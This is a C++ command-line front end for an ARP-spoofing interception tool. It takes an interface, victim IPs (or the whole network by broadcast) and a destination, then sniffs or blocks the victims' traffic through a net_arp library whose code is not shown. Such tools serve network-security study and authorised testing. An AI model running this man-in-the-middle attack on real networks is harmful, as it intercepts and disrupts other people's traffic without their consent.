#include "../../tools/net_arp/net_arp.h"

#include "../../linux/if/hardware.h"
#include "../../linux/osi/data_link_layer_gateway.h"

#include <boost/program_options.hpp>
#include <iostream>
using namespace std;

void net_intercept_main(const string &iface, const vector<ip4_addr> &victim, ip4_addr dest, bool block) {
    std::shared_ptr<iface_access_point> iface_access = make_shared<iface_access_point>(iface);

    net_arp scanner(new data_link_layer_gateway(iface_access));

    scanner.intercept_device_traffic(victim, dest, block, get_mac_addr_of_iface(iface), get_ip_addr_of_iface(iface));

}

namespace po = boost::program_options;

int main(int argc, char **argv) {
    po::options_description opts("intercept victims' traffic towards some destination. you can block or just sniff the traffic.");
    opts.add_options()
            ("help,h", "print tool use description")
            ("iface", po::value<string>(), "linux interface to use")
            ("victims", po::value<vector<string>>()->multitoken(),
             "victims' ip for the attack. if not specified, sends to whole network (broadcast)")
            ("dest", po::value<string>(),
             "destination ip from the victims into")
            ("block", "blocks the traffic, in addition to sniffing it.");

    po::variables_map vm;
    po::store(po::parse_command_line(argc, argv, opts), vm);
    po::notify(vm);


    if (vm.count("help")) {
        std::cout << opts << endl;
        return 1;
    }

    if (!vm.count("iface")) {
        std::cout << opts << endl;
        return 1;
    }
    string interface = vm["iface"].as<string>();

    if (!vm.count("dest")) {
        std::cout << opts << endl;
        return 1;
    }
    string dest = vm["dest"].as<string>();

    bool block;
    if (vm.count("block")) block = true;
    else block = false;

    vector<string> victims;
    if (vm.count("victims")) {
        victims = vm["victims"].as<vector<string>>();
    }


    std::cout << "victims: ";
    vector<ip4_addr> victims_ip;
    if (victims.empty()) std::cout << "all broadcast";
    else
        for (string &victim: victims) {
            std::cout << victim << ", ";
            victims_ip.push_back(convert_to_ip4_addr(victim));
        }
    std::cout << endl;

    net_intercept_main(interface, victims_ip, convert_to_ip4_addr(dest), block);

}